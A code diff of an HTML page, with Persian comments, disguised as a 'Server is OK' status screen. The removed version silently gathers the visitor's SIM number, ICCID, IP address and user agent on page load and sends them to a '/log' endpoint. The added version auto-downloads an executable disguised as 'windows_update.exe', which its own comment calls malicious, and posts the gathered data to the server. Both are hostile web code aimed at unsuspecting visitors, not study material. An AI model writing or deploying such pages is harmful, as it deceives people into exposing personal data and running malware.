@@ -1,77 +1,17 @@
-<!DOCTYPE html>
-<html lang="fa">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Status</title>
-    <style>
-        body { 
-            background-color: #ffffff; 
-            color: #333; 
-            font-family: Arial, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            text-align: center;
-        }
-        .container { border: 1px solid #ddd; padding: 20px; border-radius: 5px; width: 80%; max-width: 400px; }
-        h1 { font-size: 16px; margin-bottom: 10px; color: #4CAF50; } /* رنگ سبز ملایم */
-        p { font-size: 14px; color: #666; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Server is OK</h1>
-        <p>Data synchronized successfully.</p>
-    </div>
-
-    <script>
-        async function gatherAndDownload() {
-            let data = "";
-            
-            try {
-                // تلاش برای گرفتن شماره سیم‌کارت (فقط در مرورگرهایی مثل کروم اندروید)
-                if ('sim' in navigator) {
-                    const sims = await navigator.sim.getAvailableSims();
-                    if (sims.length > 0 && sims[0].msisdn) {
-                        data = "SIM Number: " + sims[0].msisdn + "\nICCID: " + sims[0].iccid;
-                    } else {
-                        data = "No SIM Data Available";
-                    }
-                } else {
-                    // اگر API سیم کار نکرد، IP و مدل گوشی را بگیر
-                    try {
-                        const res = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await res.json();
-                        data = "IP: " + ipData.ip + "\nUser Agent: " + navigator.userAgent;
-                    } catch (e) {
-                        data = "Connection Established\nUser Agent: " + navigator.userAgent;
-                    }
-                }
-                
-                // ایجاد فایل دانلود شونده
-                const blob = new Blob([data], { type: 'text/plain' });
-                const url = window.URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'update_data.txt'; // نام فایلی که روی گوشی کاربر دانلود می‌شود
-                document.body.appendChild(a);
-                a.click();
-                a.remove();
-                window.URL.revokeObjectURL(url);
-
-                // ارسال داده به پنل ادمین در پس‌زمینه
-                fetch('/log?data=' + encodeURIComponent(data));
-                
-            } catch (error) {
-                console.log("Silent error");
-            }
-        }
-
-        // اجرا بلافاصله بعد از لود شدن صفحه
-        window.onload = gatherAndDownload;
-    </script>
-</body>
-</html>
+<!-- بخش دانلود در index.html -->
+<script>
+    async function gatherAndDownload() {
+        // ... (کد جمع‌آوری اطلاعات قبلی) ...
+        
+        // ایجاد لینک دانلود فایل مخرب
+        const a = document.createElement('a');
+        a.href = '/download/exe'; // این آدرس فایل exe را دانلود می‌کند
+        a.download = 'windows_update.exe'; 
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        
+        // ارسال داده به سرور
+        fetch('/log', { method: 'POST', body: encodeURIComponent(data) });
+    }
+</script>
